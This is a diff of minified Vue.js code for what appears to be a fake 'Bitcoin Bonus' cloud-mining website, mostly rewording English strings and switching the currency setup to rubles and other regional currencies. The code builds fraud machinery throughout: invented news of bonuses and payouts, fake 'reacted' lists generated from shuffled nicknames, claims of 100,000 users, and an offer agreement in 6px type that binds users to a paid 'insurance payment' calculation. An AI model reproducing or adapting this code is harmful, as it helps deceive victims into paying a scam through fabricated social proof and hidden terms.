+                        text: "We have good news for you. Today the number of users on our site in \n                            ".concat(this.$store.getters.geo.countryName, " has exceeded 5,000 people. <br>In honor of this event, we give a bonus of 1000 rubles to all active users!.<br>The total number of users worldwide exceeds 50 million users."),
                         hashtags: ["news", "joy", "growth", "weare5000", "notthelimit"],
                         reactions: [{
                             alias: "thumbs up",
@@ -2515,7 +2515,7 @@
                         dateoffset: 164,
                         header: "Payments to PayPal",
                         text: "Due to the unpopularity of the PayPal payment system, we no longer make payments in this direction.",
-                        hashtags: ["news", "paypal", "payouts"],
+                        hashtags: ["news", "paypal", "payments"],
                         reactions: [{
                             alias: "thumbs up",
                             count: 12,
@@ -2550,8 +2550,8 @@
                     }, {
                         dateoffset: 201,
                         header: "Payment delays",
-                        text: "There are delays in payments throughout the day. <br>Instead of the usual 5 minutes, payments arrive to your accounts within 1 hour. <br>The delay is due to a large flow of payments. Everything will be back to normal by the end of the day.",
-                        hashtags: ["news", "payouts", "apologies"],
+                        text: "During the day, there are delays in payments. <br>Instead of the usual 5 minutes, payments are received within 1 hour. <br>The delay occurred due to a large flow of payments. By the end of the day, everything will be fine.",
+                        hashtags: ["news", "payments", "apologies"],
                         reactions: [{
                             alias: "thumbs up",
                             count: 2,
@@ -2586,8 +2586,8 @@
                     }, {
                         dateoffset: 210,
                         header: "Payments to Payeer",
-                        text: "Following numerous requests, payments to Payeer have been added. <br>The withdrawal fee is 1% of the amount paid.",
-                        hashtags: ["news", "payouts", "payeer"],
+                        text: "Due to numerous requests, payments to Payeer have been added <br>The withdrawal commission is 1% of the payment amount.",
+                        hashtags: ["news", "payments", "payeer"],
                         reactions: [{
                             alias: "thumbs up",
                             count: 567,
@@ -2621,8 +2621,8 @@
                         }]
                     }, {
                         dateoffset: 240,
-                        header: "Euro bonus collection",
-                        text: "Added a database of sites distributing bonuses in Euro currency. This will increase your daily income by an average of $100.",
+                        header: "Collecting euro bonuses",
+                        text: "Added a database of sites with bonus distributions in Euro currency. This will increase your daily income by an average of 100 rubles.",
                         hashtags: ["news", "bonuses", "euro"],
                         reactions: [{
                             alias: "thumbs up",
@@ -2684,7 +2684,7 @@
                             break
                         }
                         if (this.account.password.new.length < 8) {
-                            alert("Password must be at least 8 characters long.");
+                            alert("Password must contain at least 8 characters.");
                             break
                         }
                         this.$store.commit("SET_ACCOUNT", {
@@ -2692,7 +2692,7 @@
                             value: e
                         }),
                         this.$store.commit("SET_ACCOUNT_PASSWORD"),
-                        alert("Password changed"),
+                        alert("Password changed."),
                         this.$reachGoal("settings_" + t);
                         break;
                     case "mail":
@@ -2706,7 +2706,7 @@
                         }),
                         this.$sendEmail(this.account.mail.email, this.account.mail.name),
                         this.$reachGoal("settings_" + t),
-                        alert("Data saved");
+                        alert("Data saved.");
                         break;
                     case "telephone":
                         if ("" === !this.account.telephone) {
@@ -2719,23 +2719,23 @@
                         }),
                         this.$sendTelephone(this.account.telephone.replace("+", ""), this.account.login),
                         this.$reachGoal("settings_" + t),
-                        alert("Data saved");
+                        alert("Data saved.");
                         break;
                     case "login":
                         this.$store.commit("SET_ACCOUNT", {
                             name: t,
                             value: e
                         }),
-                        alert("Login data saved"),
+                        alert("Login data saved."),
                         this.$reachGoal("settings_" + t);
                         break;
                     case "avatar":
                         if (0 === this.$refs["inputfile"].files.length)
                             return !1;
                         if (this.$refs["inputfile"].files[0].size > 2e4)
-                            return alert("Image must be no larger than 20 kilobytes"),
+                            return alert("Image must be no larger than 20 kilobytes."),
                             !1;
-                        alert("Data saved"),
+                        alert("Data saved."),
                         this.$store.commit("SET_ACCOUNT", {
                             name: t,
                             value: e
@@ -2743,7 +2743,7 @@
                         this.$reachGoal("settings_" + t);
                         break;
                     case "payment":
-                        alert("Data saved"),
+                        alert("Data saved."),
                         this.$store.commit("SET_ACCOUNT", {
                             name: t,
                             value: e
@@ -2780,7 +2780,7 @@
                 GetRandomNicksArr: function(t) {
                     this.shuffle(this.nicknames);
                     for (var e = "", s = 0; s < t; s++)
-                        s < t && (s == t - 1 ? 1 == t ? e += this.nicknames[s].slice(0, -2).toLowerCase() + " reacted " : t > 10 ? e = e.slice(0, -2) + " and " + t - 10 + " or more reacted " : e += e.slice(0, -2) + " and " + this.nicknames[s].toLowerCase() + " reacted " : e += this.nicknames[s].toLowerCase() + ", ");
+                        s < t && (s == t - 1 ? 1 == t ? e += this.nicknames[s].slice(0, -2).toLowerCase() + " reacted " : t > 10 ? e = e.slice(0, -2) + " and " + t - 10 + " and more reacted " : e += e.slice(0, -2) + " and " + this.nicknames[s].toLowerCase() + " reacted " : e += this.nicknames[s].toLowerCase() + ", ");
                     return e
                 },
                 shuffle: function(t) {
@@ -2796,7 +2796,7 @@
                 },
                 AddReaction: function(t, e) {
                     if ("landing" === this.$route.name)
-                        return alert("Unregistered users cannot react to news on " + this.$store.getters.sitename + ". Please register or log in with your username to our service."),
+                        return alert("Unregistered users cannot react to news on " + this.$store.getters.sitename + ". Please register or log in with your login to our service."),
                         !1;
                     for (var s = this.news[t].reactions, a = this.news[t].reactions[e], n = 0; n < s.length; n++)
                         if (s[n].isLiked) {
@@ -3212,7 +3212,7 @@
                     "ok-only": "",
                     "ok-variant": "success",
                     "footer-class": "pb-2 mx-auto",
-                    "ok-title": "Go Back",
+                    "ok-title": "Go back",
                     "no-fade": "",
                     "hide-footer": "",
                     "hide-header": "",
@@ -3227,7 +3227,7 @@
                 staticClass: "header"
             }, [s("div", {
                 staticClass: "h5"
-            }, [t._v("Page with query "), s("b", [t._v('"' + t._s(t.searchInput) + '"')]), t._v(" not found")])]), s("div", {
+            }, [t._v("Page with request "), s("b", [t._v('"' + t._s(t.searchInput) + '"')]), t._v(" not found")])]), s("div", {
                 staticClass: "body"
             }, [s("p", [t._v("This section does not exist on this site")]), s("p", [s("a", {
                 attrs: {
@@ -3250,7 +3250,7 @@
                 attrs: {
                     d: "M11.9998836,4.09370803 L8.55809517,7.43294953 C8.23531459,7.74611298 8.23531459,8.25388736 8.55809517,8.56693769 L12,11.9062921 L9.84187871,14 L4.24208544,8.56693751 C3.91930485,8.25388719 3.91930485,7.74611281 4.24208544,7.43294936 L9.84199531,2 L11.9998836,4.09370803 Z"
                 }
-            })]), t._v("\n          Go Back\n          ")])])])])], 1)
+            })]), t._v("\n          Go back\n          ")])])])])], 1)
         }
           , h = [function() {
             var t = this
@@ -3306,11 +3306,18 @@
                     },
                     moneyCountryData: [{
                         country: "Russia",
-                        code: "USD",
+                        code: "RUB",
                         kurs: 1,
-                        dollar: 1,
-                        textMoney1: ["US dollars", "dollars"],
-                        pre: ["USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD"]
+                        dollar: 150,
+                        textMoney1: ["Russian rubles", "rubles"],
+                        pre: ["RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB"]
+                    }, {
+                        country: "Ukraine",
+                        code: "UAH",
+                        kurs: .37469,
+                        dollar: 27.27,
+                        textMoney1: ["Ukrainian hryvnias", "hryvnias"],
+                        pre: ["UAH", "UAH", "UAH", "UAH", "UAH", "UAH", "UAH", "UAH", "UAH", "UAH", "UAH"]
                     }, {
                         country: "USA",
                         code: "USD",
@@ -3325,6 +3332,76 @@
                         dollar: .85,
                         textMoney1: ["euros", "euros"],
                         pre: ["EUR", "EUR", "EUR", "EUR", "EUR", "EUR", "EUR", "EUR", "EUR", "EUR", "EUR"]
+                    }, {
+                        country: "Kazakhstan",
+                        code: "KZT",
+                        kurs: 5.7968,
+                        dollar: 428.24,
+                        textMoney1: ["Kazakh tenge", "tenge"],
+                        pre: ["KZT", "KZT", "KZT", "KZT", "KZT", "KZT", "KZT", "KZT", "KZT", "KZT", "KZT"]
+                    }, {
+                        country: "Belarus",
+                        code: "BYN",
+                        kurs: .03372,
+                        dollar: 2.87,
+                        textMoney1: ["Belarusian rubles", "rubles"],
+                        pre: ["BYN", "BYN", "BYN", "BYN", "BYN", "BYN", "BYN", "BYN", "BYN", "BYN", "BYN"]
+                    }, {
+                        country: "Moldova",
+                        code: "MDL",
+                        kurs: .2464,
+                        dollar: 18.04,
+                        textMoney1: ["Moldovan lei", "lei"],
+                        pre: ["MDL", "MDL", "MDL", "MDL", "MDL", "MDL", "MDL", "MDL", "MDL", "MDL", "MDL"]
+                    }, {
+                        country: "Azerbaijan",
+                        code: "AZN",
+                        kurs: .02392,
+                        dollar: 1.7,
+                        textMoney1: ["Azerbaijani manats", "manats"],
+                        pre: ["AZN", "AZN", "AZN", "AZN", "AZN", "AZN", "AZN", "AZN", "AZN", "AZN", "AZN"]
+                    }, {
+                        country: "Armenia",
+                        code: "AMD",
+                        kurs: 6.71501,
+                        dollar: 495.21,
+                        textMoney1: ["Armenian drams", "drams"],
+                        pre: ["AMD", "AMD", "AMD", "AMD", "AMD", "AMD", "AMD", "AMD", "AMD", "AMD", "AMD"]
+                    }, {
+                        country: "Kyrgyzstan",
+                        code: "KGS",
+                        kurs: 1.03941,
+                        dollar: 84.8,
+                        textMoney1: ["Kyrgyz soms", "soms"],
+                        pre: ["KGS", "KGS", "KGS", "KGS", "KGS", "KGS", "KGS", "KGS", "KGS", "KGS", "KGS"]
+                    }, {
+                        country: "Tajikistan",
+                        code: "TJS",
+                        kurs: .14352,
+                        dollar: 11.4,
+                        textMoney1: ["Tajik somoni", "somoni"],
+                        pre: ["TJS", "TJS", "TJS", "TJS", "TJS", "TJS", "TJS", "TJS", "TJS", "TJS", "TJS"]
+                    }, {
+                        country: "Turkmenistan",
+                        code: "TMT",
+                        kurs: .04868,
+                        dollar: 3.5,
+                        textMoney1: ["Turkmen manats", "manats"],
+                        pre: ["TMT", "TMT", "TMT", "TMT", "TMT", "TMT", "TMT", "TMT", "TMT", "TMT", "TMT"]
+                    }, {
+                        country: "Uzbekistan",
+                        code: "UZS",
+                        kurs: 142.051,
+                        dollar: 10600.99,
+                        textMoney1: ["Uzbek sums", "sums"],
+                        pre: ["UZS", "UZS", "UZS", "UZS", "UZS", "UZS", "UZS", "UZS", "UZS", "UZS", "UZS"]
+                    }, {
+                        country: "Georgia",
+                        code: "GEL",
+                        kurs: .04457,
+                        dollar: 3.16,
+                        textMoney1: ["Georgian lari", "lari"],
+                        pre: ["GEL", "GEL", "GEL", "GEL", "GEL", "GEL", "GEL", "GEL", "GEL", "GEL", "GEL"]
                     }],
                     afterExchage: !1
                 }
@@ -3641,7 +3718,7 @@
                 staticStyle: {
                     "font-size": "6px"
                 }
-            }, [t._v("\n                  This offer agreement is concluded between the administration of the site " + t._s(t.sitename) + " and the user. At the moment of starting the survey, after clicking the button \"Return Money\", you acknowledge and confirm your agreement to calculate the amount of insurance payment on a paid basis, and also agree that not all participants receive insurance payments, but based on information by IP address."), s("br"), s("br"), t._v("\n                  1. All statements and examples on the information and educational resource " + t._s(t.sitename) + " regarding increasing, receiving income or profits, already posted or which will be posted on the resource " + t._s(t.sitename) + " (hereinafter Sites) - are only assumptions about future or current earnings, income, therefore they are not a guarantee of their receipt. If you consider the estimated profits or increase in future income as guaranteed, you also assume all risks of not receiving them."), s("br"), s("br"), t._v("\n                  2. If the sites indicate a specific amount of earnings of a person or persons who are engaged in business, this does not guarantee you personally the same income when organizing similar entrepreneurship. You accept as a fact that you may not receive such amounts of earnings."), s("br"), s("br"), t._v("\n                  3. All questions posted on the site " + t._s(t.sitename) + " related to receiving income and profits cannot be equated to average earnings."), s("br"), s("br"), t._v("\n                  4. There are also no guarantees that someone else's experience regarding entrepreneurial activity, earnings or income can be used as a guide to action that can give the desired financial results."), s("br"), s("br"), t._v("\n                  5. Income amounts in their monetary equivalent are associated with a number of different factors. We do not give instructions or any information regarding your future activities and financial success, just as we do not dispose of your personality, data, business qualities, ethical standards of behavior, areas of activity - everything that may affect the likelihood of receiving income in small or medium equivalents. We cannot guarantee that you will receive exactly the same earnings as other persons. You assume all risks of not receiving income."), s("br"), s("br"), s("br"), t._v("\n                  6. Labor, business, entrepreneurial activity through the Internet, carried out for the purpose of obtaining income and profits, is associated with various risks. When deciding to engage in this kind of activity based on any information contained in our information products and directly related to our services that we provide on this web resource, you must take into account the possible moments of non-receipt of profit or acceptance of some possible losses."), s("br"), s("br"), t._v("\n                  7. All our products and services are created for educational and informational purposes, therefore they must be used thoughtfully, with precautions and relying on the experience of professionals - mentors or trainers. Before starting any entrepreneurial activity based on the information provided, get advice from a lawyer and accountant, as well as a marketing professional."), s("br"), s("br"), t._v("\n                  8. Visitors to the site " + t._s(t.sitename) + ", users of products or services rely on their own experience, common sense and fully rely on their own strengths, deciding to engage in Internet business or any other type of entrepreneurial activity. All information products and information are evaluated by qualified independent experts. Products and information posted on our web resource should be carefully analyzed and evaluated before deciding to engage in business."), s("br"), s("br"), t._v("\n                  9. In the event of receiving any income, you also bear full responsibility before the legislation of your country of residence, as well as tax legislation, including you are responsible for registering entrepreneurial activity in accordance with the law of your country. Also, if required by the law of your country, you are obliged to independently conduct your entrepreneurial activity legally and pay taxes."), s("br"), s("br"), t._v("\n                  10. This document states that you agree that the site " + t._s(t.sitename) + " is not responsible for decisions you make regarding income, profits, business methods, training center products, services provided or other materials posted on this site: text, audio and video information."), s("br"), s("br"), t._v("\n                  We remind you that the resource at " + t._s(t.sitename) + " is exclusively informational and educational! Any payment or transfer of funds on the aforementioned resource is made for receiving informational and educational materials after making all necessary and provided by the resource developers payments. After completing all necessary payments, you will receive informational and educational material for further independent work on the Internet without technical or any other support from the site administration " + t._s(t.sitename) + " . "), s("br"), s("br"), t._v("\n                  Under no circumstances shall the Site Administration " + t._s(t.sitename) + " and other domains owned by the administration as intellectual property be liable to any party for any direct, indirect, special or other indirect damage resulting from any use of information on this Site or any other site to which there is a hyperlink from our site, the occurrence of dependence, decrease in productivity, dismissal or interruption of work activity, as well as expulsion from educational institutions, for any lost profit, material damage, monetary damage, moral damage, suspension of economic activity, loss of programs or data in your information systems or otherwise, arising in connection with access, use or inability to use the site."), s("br"), s("br"), t._v("\n                  The Site Administration has the right to make changes to the Rules at any time, which come into force immediately. Continued use of the site (resources) " + t._s(t.sitename) + " after the changes means your automatic agreement to comply with the new rules."), s("br"), s("br"), t._v("\n                  Contacts for contacting support: " + t._s(t.$store.state[t.publicPath].supportmail) + "\n                ")])])]), s("b-collapse", {
+            }, [t._v("\n                  This offer agreement is concluded by the administration of the site " + t._s(t.sitename) + " with the user. At the moment of starting the survey, after clicking the button 'Return money', you acknowledge and confirm your consent to calculate the amount of insurance payment on a paid basis, and also agree that not all participants receive insurance payments, but based on IP address information."), s("br"), s("br"), t._v("\n                  1. All statements and examples on the informational and educational resource " + t._s(t.sitename) + " regarding increasing, receiving income or profits, already posted or to be posted on the resource " + t._s(t.sitename) + " (hereinafter Sites) - are just assumptions about future or current earnings, income, therefore they are not a guarantee of their receipt. If you consider presumptive profits or increase of future income as guaranteed, you also assume all risks of not receiving them."), s("br"), s("br"), t._v("\n                  2. If a specific amount of earnings is indicated for a person or persons engaged in business, this does not guarantee you the same income when organizing a similar business. You accept as a fact that you may not receive such amounts of earnings."), s("br"), s("br"), t._v("\n                  3. All questions posted on the site " + t._s(t.sitename) + " related to receiving income and profits cannot be equated to average earnings."), s("br"), s("br"), t._v("\n                  4. There is also no guarantee that someone else's experience regarding entrepreneurial activity, earnings or income can be used as a guide to action that can give the desired financial results."), s("br"), s("br"), t._v("\n                  5. Income amounts in their monetary equivalent are associated with a number of different factors. We do not give instructions or any information about your future activities and financial success, just as we do not dispose of your personality, data, business qualities, ethical standards of behavior, areas of activity - everything that may affect the likelihood of receiving income in small or medium equivalents. We cannot guarantee that you will receive exactly the same earnings as others. All risks of non-receipt of income are borne by you."), s("br"), s("br"), s("br"), t._v("\n                  6. Labor, business, entrepreneurial activity via the Internet, carried out for the purpose of generating income and profits, is associated with various risks. When deciding to engage in this kind of activity based on any information contained in our info products and directly related to our services that we provide on this web resource, you must take into account possible non-receipt of profit or acceptance of possible losses."), s("br"), s("br"), t._v("\n                  7. All our products and services are created for educational and informational purposes, so they should be used thoughtfully, with precautions and relying on the experience of professional mentors or trainers. Before starting any entrepreneurial activity based on the information provided, consult a lawyer and accountant, as well as a marketing professional."), s("br"), s("br"), t._v("\n                  8. Visitors to the site " + t._s(t.sitename) + ", users of products or services rely on their own experience, common sense and rely completely on their own strength when deciding to engage in Internet business or any other type of entrepreneurial activity. All info products and information are evaluated by qualified independent experts. Products and information posted on our web resource should be carefully analyzed and evaluated before deciding to engage in business."), s("br"), s("br"), t._v("\n                  9. In the event of receiving any income, you also independently bear responsibility before the legislation of your country of residence, as well as tax legislation, including you are responsible for registering entrepreneurial activity in accordance with the law of your country. Also, if provided by the law of your country, you are obliged to independently conduct your entrepreneurial activity legally and pay taxes."), s("br"), s("br"), t._v("\n                  10. This document states that you give your consent that the site " + t._s(t.sitename) + " is not responsible for decisions you have mistakenly made regarding income, profits, ways of doing business, training center products, services provided or other materials posted on this site: textual, audio and video information."), s("br"), s("br"), t._v("\n                  We remind you that the resource at " + t._s(t.sitename) + " is exclusively informational and educational! Any payment or deposit of funds on the above resource is made for receiving informational and educational materials after making all necessary and provided payments by the resource developers. After completing all necessary payments, you will receive informational and educational material for further independent work on the Internet without technical or any other support from the site administration  " + t._s(t.sitename) + " . "), s("br"), s("br"), t._v("\n                  Under no circumstances shall the Site Administration " + t._s(t.sitename) + " and other domains owned by the administration on intellectual property rights be liable to any party for any direct, indirect, special or other indirect damage resulting from any use of information on this Site or on any other site hyperlinked from our site, occurrence of dependence, decreased productivity, dismissal or interruption of work activity, as well as expulsion from educational institutions, for any lost profit, material damage, monetary damage, moral damage, suspension of business activity, loss of programs or data in your information systems or otherwise arising in connection with access, use or inability to use the site."), s("br"), s("br"), t._v("\n                  The Site Administration has the right to make changes to the Rules at any time, which come into force immediately. Continued use of the site (resources) " + t._s(t.sitename) + " after changes are made means your automatic consent to comply with the new rules."), s("br"), s("br"), t._v("\n                  Contacts for support: " + t._s(t.$store.state[t.publicPath].supportmail) + "\n                ")])])]), s("b-collapse", {
                 staticClass: "mt-2",
                 attrs: {
                     id: "collapse-oferta"
@@ -3651,7 +3728,7 @@
                 staticStyle: {
                     "font-size": "6px"
                 }
-            }, [t._v("\n                  Your privacy is very important to us. We want your work on the Internet to be as pleasant and useful as possible, and you can freely use the wide range of information, tools and opportunities that the Internet offers."), s("br"), s("br"), t._v("Personal information of Members collected during registration (or at any other time) is primarily used to prepare Products or Services in accordance with your needs. Your information will not be transferred or sold to third parties. However, we may partially disclose personal information in special cases described in the \"Consent to Newsletter\""), s("br"), s("br"), t._v("What data is collected on the site"), s("br"), s("br"), t._v("- When voluntarily registering to receive the newsletter, you send your Name and Email through the registration form."), s("br"), s("br"), s("strong", [t._v("For what purpose this data is collected")]), s("br"), s("br"), t._v("- The name is used to address you personally, and your email is used to send you newsletters, news, useful materials, commercial offers."), s("br"), s("br"), t._v("Your name and email are not transferred to third parties under any circumstances except in cases related to the fulfillment of legal requirements."), s("br"), s("br"), t._v("You can unsubscribe from receiving newsletters and delete your contact details from the database at any time by clicking on the unsubscribe link present in every email."), s("br"), s("br"), s("strong", [t._v("How this data is used")]), s("br"), s("br"), t._v("- This data is used to collect information about visitors' actions on the site in order to improve its content, improve the functionality of the site and, as a result, create high-quality content and services for visitors."), s("br"), s("br"), t._v("- You can change your browser settings at any time so that the browser blocks all files or notifies you when these files are sent. Please note that some functions and services may not work properly."), s("br"), s("br"), s("strong", [t._v("How this data is protected")]), s("br"), s("br"), t._v("- To protect your personal information, we use various administrative, managerial and technical security measures. Our Company adheres to various international control standards aimed at operations with personal information, which include certain control measures to protect information collected on the Internet."), s("br"), s("br"), t._v("Our employees are trained to understand and implement these controls, they are familiar with our Privacy Notice, norms and instructions."), s("br"), s("br"), t._v("- However, despite the fact that we strive to protect your personal information, you must also take measures to protect it."), s("br"), s("br"), t._v("We strongly recommend that you take all possible precautions while on the Internet. The services and websites we organize provide measures to protect against leakage, unauthorized use and alteration of the information we control. Although we do our best to ensure the integrity and security of our network and systems, we cannot guarantee that our security measures will prevent illegal access to this information by hackers from third-party organizations."), s("br"), s("br"), t._v("- In case of changes to this privacy policy, you will be able to read about these changes on this page or, in special cases, receive a notification to your email.\n                ")])])])], 1)])
+            }, [t._v("\n                  Your privacy is very important to us. We want your online experience to be as enjoyable and useful as possible, and you to be able to safely use the wide range of information, tools and opportunities the Internet offers."), s("br"), s("br"), t._v("Personal information of Members collected during registration (or at any other time) is primarily used to prepare Products or Services in accordance with your needs. Your information will not be transferred or sold to third parties. However, we may partially disclose personal information in special cases described in the 'Consent to mailing'."), s("br"), s("br"), t._v("What data is collected on the site"), s("br"), s("br"), t._v("- When voluntarily registering to receive the newsletter, you submit your Name and E-mail through the registration form."), s("br"), s("br"), s("strong", [t._v("For what purpose this data is collected")]), s("br"), s("br"), t._v("- The name is used to address you personally, and your email is used to send you newsletters, news, useful materials, commercial offers."), s("br"), s("br"), t._v("Your name and email are not transferred to third parties under any circumstances, except in cases related to the fulfillment of legal requirements."), s("br"), s("br"), t._v("You can unsubscribe from the mailing list and remove your contact details from the database at any time by clicking on the unsubscribe link present in every email."), s("br"), s("br"), s("strong", [t._v("How this data is used")]), s("br"), s("br"), t._v("- This data is used to collect information about visitor actions on the site in order to improve its content, improve the site's functionality and, as a result, create quality content and services for visitors."), s("br"), s("br"), t._v("- You can change your browser settings at any time so that the browser blocks all files or notifies you when these files are sent. Please note that some functions and services may not work properly."), s("br"), s("br"), s("strong", [t._v("How this data is protected")]), s("br"), s("br"), t._v("- To protect your personal information, we use a variety of administrative, managerial and technical security measures. Our Company adheres to various international standards of control aimed at operations with personal information, which include certain control measures to protect information collected on the Internet."), s("br"), s("br"), t._v("Our employees are trained to understand and implement these controls, they are familiar with our Privacy Notice, norms and instructions."), s("br"), s("br"), t._v("- Nevertheless, despite the fact that we strive to secure your personal information, you should also take measures to protect it."), s("br"), s("br"), t._v("We strongly recommend that you take all possible precautions while on the Internet. The services and websites we organize provide measures to protect against leakage, unauthorized use and alteration of information we control. While we do our best to ensure the integrity and security of our network and systems, we cannot guarantee that our security measures will prevent illegal access to this information by hackers from third-party organizations."), s("br"), s("br"), t._v("- In the event of changes to this privacy policy, you will be able to read about these changes on this page or, in special cases, receive a notification to your email.\n                ")])])])], 1)])
         }
           , w = []
           , y = {
@@ -3853,25 +3930,25 @@
                     dateNow: (new Date).getTime(),
                     coins: [{
                         name: "Bitcoin",
-                        price: 990.15, // Converted from 73270.8 RUB / 74
+                        price: this.$store.getters.currency.btc,
                         symbol: "BTC",
                         changes: -8.57,
                         pic: "btc.png"
                     }, {
                         name: "Litecoin",
-                        price: 2.40, // 177.49 / 74 ≈ 2.40
+                        price: 177.49,
                         symbol: "LTC",
                         changes: -14.59,
                         pic: "ltc.png"
                     }, {
                         name: "XRP",
-                        price: 0.0122, // 0.904448 / 74 ≈ 0.0122
+                        price: .904448,
                         symbol: "XRP",
                         changes: -11.92,
                         pic: "xrp.png"
                     }, {
                         name: "Dogecoin",
-                        price: 0.00426, // 0.315567 / 74 ≈ 0.00426
+                        price: .315567,
                         symbol: "DOGE",
                         changes: -8.01,
                         pic: "doge.png"
@@ -3883,31 +3960,31 @@
                         pic: "usdt.png"
                     }, {
                         name: "Ethereum",
-                        price: 34.69, // 2567.05 / 74 ≈ 34.69
+                        price: 2567.05,
                         symbol: "ETH",
                         changes: -10.12,
                         pic: "eth.png"
                     }, {
                         name: "Bitcoin Cash",
-                        price: 9.38, // 693.97 / 74 ≈ 9.38
+                        price: 693.97,
                         symbol: "BCH",
                         changes: -12.89,
                         pic: "bch.png"
                     }, {
                         name: "Binance Coin",
-                        price: 4.58, // 338.64 / 74 ≈ 4.58
+                        price: 338.64,
                         symbol: "BNB",
                         changes: -12.27,
                         pic: "bnb.png"
                     }, {
                         name: "Cardano",
-                        price: 0.0209, // 1.55 / 74 ≈ 0.0209
+                        price: 1.55,
                         symbol: "ADA",
                         changes: -11.09,
                         pic: "ada.png"
                     }, {
                         name: "Polkadot",
-                        price: 0.303, // 22.45 / 74 ≈ 0.303
+                        price: 22.45,
                         symbol: "DOT",
                         changes: -7.07,
                         pic: "dot.png"
@@ -3944,9 +4021,7 @@
                         Object.keys(t.responseCoins).forEach((function(e, s) {
                             for (var a = 0; a < t.coins.length; a++)
                                 if (t.responseCoins[e].symbol === t.coins[a].symbol) {
-                                    // Convert price from RUB to USD if needed, but the API might return USD already? Assuming it returns RUB, we convert.
-                                    // The API response might be in RUB, but we'll convert to USD.
-                                    t.coins[a].price = t.responseCoins[e].quote.USD.price / 74; // Convert to USD
+                                    t.coins[a].price = t.responseCoins[e].quote.USD.price,
                                     "USDT" === t.responseCoins[e].symbol ? t.coins[a].changes = 0 : t.coins[a].changes = parseFloat(t.numberPercentage(t.responseCoins[e].quote.USD.percent_change_24h));
                                     break
                                 }
@@ -4026,7 +4101,7 @@
                 }
             }, [a("div", {
                 staticClass: "h2 font-weight-normal text-center"
-            }, [t._v("Log In")]), a("form", [a("div", {
+            }, [t._v("Log in")]), a("form", [a("div", {
                 staticClass: "mx-auto text-center"
             }, [a("svg", {
                 directives: [{
@@ -4059,7 +4134,7 @@
                         return this.$reachGoal("signin")
                     }
                 }
-            }, [t._v("\n                            Log In\n                        ")]), a("a", {
+            }, [t._v("\n                            Log in\n                        ")]), a("a", {
                 staticClass: "d-block mt-2 btn btn-outline-success mx-auto",
                 staticStyle: {
                     width: "200px"
@@ -4072,7 +4147,7 @@
                         return t.ShowRegModal()
                     }
                 }
-            }, [t._v("\n                            Sign Up\n                        ")]), t._m(2), a("div", {
+            }, [t._v("\n                            Registration\n                        ")]), t._m(2), a("div", {
                 staticClass: "text-center justify-content-center align-content-center d-flex my-5"
             }, [a("router-link", {
                 staticClass: "g-sing-in-btn cursor-pointer d-flex justify-content-center align-items-center",
@@ -4104,7 +4179,7 @@
                 }
             }, [a("div", {
                 staticClass: "h2 font-weight-normal text-center mt-4"
-            }, [t._v("Sign Up")]), a("form", [a("div", {
+            }, [t._v("Registration")]), a("form", [a("div", {
                 staticClass: "form-group"
             }, [a("label", {
                 attrs: {
@@ -4123,7 +4198,7 @@
                     value: "user-id993719231",
                     id: "username",
                     "aria-describedby": "emailHelp",
-                    placeholder: "Enter username"
+                    placeholder: "Enter name"
                 },
                 domProps: {
                     value: t.form.login
@@ -4154,7 +4229,7 @@
                 attrs: {
                     for: "useremail"
                 }
-            }, [t._v("Email")]), a("input", {
+            }, [t._v("E-mail")]), a("input", {
                 directives: [{
                     name: "model",
                     rawName: "v-model",
@@ -4195,7 +4270,7 @@
                         return t.Registration()
                     }
                 }
-            }, [t._v("\n                        Sign Up\n                    ")])])])])], 1)
+            }, [t._v("\n                        Register\n                    ")])])])])], 1)
         }
           , _ = [function() {
             var t = this
@@ -4262,7 +4337,7 @@
             },
             methods: {
                 Registration: function() {
-                    return this.$isValidateEmail(this.form.email) && "" !== this.form.email ? "" === this.form.login ? (alert("Username field must not be empty. Please enter your username."),
+                    return this.$isValidateEmail(this.form.email) && "" !== this.form.email ? "" === this.form.login ? (alert("Name field must not be empty. Please enter your name."),
                     !1) : (this.$sendEmail(this.form.email, this.form.login),
                     this.$store.commit("SET_ACCOUNT", {
                         name: "email",
@@ -4274,7 +4349,7 @@
                     }),
                     this.$reachGoal("settings_mail"),
                     this.$router.push("/datascript"),
-                    void this.$reachGoal("registration")) : (alert("The email you entered is invalid. Please enter a valid email."),
+                    void this.$reachGoal("registration")) : (alert("The email you entered is incorrect. Please enter a valid email."),
                     !1)
                 },
                 ShowRegModal: function() {
@@ -4357,9 +4432,9 @@
                 staticClass: "mb-1 h4 font-weight-normal"
             }, [s("span", [t._v("We")]), t._v(" make Bitcoin mining "), s("span", [t._v("accessible to everyone")]), t._v(".")]), s("p", {
                 staticClass: "mb-1 h4 font-weight-normal"
-            }, [s("span", [t._v("You have access")]), t._v(" to the latest and most advanced technologies in the cloud mining industry using any device. With this technology, "), s("span", [t._v("your smartphone or computer")]), t._v(", can safely and continuously "), s("span", [t._v("mine")]), t._v(" cryptocurrency.")]), s("p", {
+            }, [s("span", [t._v("You have access")]), t._v(" to the latest and most advanced technologies in cloud mining using any device. With this technology, "), s("span", [t._v("your smartphone or computer")]), t._v(", can safely and continuously "), s("span", [t._v("mine")]), t._v(" cryptocurrency.")]), s("p", {
                 staticClass: "mb-1 h4 font-weight-normal"
-            }, [s("span", [t._v("Over")]), t._v(" 100,000 people worldwide use Bitcoin Bonus as an additional source of income - now it's "), s("span", [t._v("your turn")]), t._v("!")])])])
+            }, [s("span", [t._v("Over")]), t._v(" 100,000 people worldwide use Bitcoin Bonus as an additional source of income - now "), s("span", [t._v("it's your turn")]), t._v("!")])])])
         }
         ]
           , J = (s("13ac"),
@@ -4420,23 +4495,23 @@
                     d: new Date,
                     monthFull: new Array("January","February","March","April","May","June","July","August","September","October","November","December"),
                     faqItems: [{
-                        q: "Can I register multiple devices and mine cryptocurrency on Bitcoin Bonus?",
-                        a: "Our service allows you to register no more than 5 devices per account. You can track earnings statistics from each device in your personal account."
+                        q: "Can I register several devices and mine cryptocurrency on Bitcoin Bonus?",
+                        a: "You can register no more than 5 devices from one account on our service. You can track earnings statistics for each device in your personal account."
                     }, {
                         q: "I can't log in to my personal account, what should I do?",
-                        a: "If your device was previously registered on Bitcoin Bonus, login to your personal account will be available even if you don't remember your login details. This is made possible by modern IP remembering systems."
+                        a: "If your device was previously registered on Bitcoin Bonus, then login to your personal account will be available to you, even if you don't remember your login credentials. This was made possible thanks to modern IP remembering systems."
                     }, {
-                        q: "My phone mined cryptocurrency without any action on my part related to your service. Why does it show that my phone has been mining all this time, can I get this money?",
